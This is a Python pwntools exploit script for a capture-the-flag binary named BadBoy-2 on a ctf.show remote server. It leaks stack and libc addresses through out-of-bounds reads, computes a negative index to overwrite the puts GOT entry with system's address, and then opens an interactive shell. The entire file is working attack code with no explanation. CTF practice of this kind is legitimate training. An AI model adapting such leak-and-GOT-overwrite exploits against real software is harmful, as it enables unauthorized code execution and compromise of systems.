from pwn import *

context(os='linux', arch='amd64', log_level='debug')
filename = './BadBoy-2'
# io = process(filename)
io = remote('pwn.challenge.ctf.show', 28151)
elf = ELF(filename)
libc = ELF('libc.so.6')
io.sendlineafter('i am bad boy \n',str(40))
stack_addr = u64(io.recv(6).ljust(8,b'\x00'))
log.success(hex(stack_addr))

io.sendlineafter('i am bad boy \n',str(24))
libc_start_call_main = u64(io.recv(3).ljust(8,b'\x00'))
log.success('libc_start_call_main'+hex(libc_start_call_main))

io.sendlineafter(b"because i'm not girl ",b'sh\x00')
puts_got_idx = -(stack_addr-0xf8-elf.got['puts'])
log.success('puts_got_idx'+hex(puts_got_idx))

io.sendlineafter(b'so can you fell me? ',str(puts_got_idx))
system_addr=libc_start_call_main-0x21c87+libc.sym['system']
io.sendlineafter(b'HaHaHa ', p64(system_addr))
io.interactive()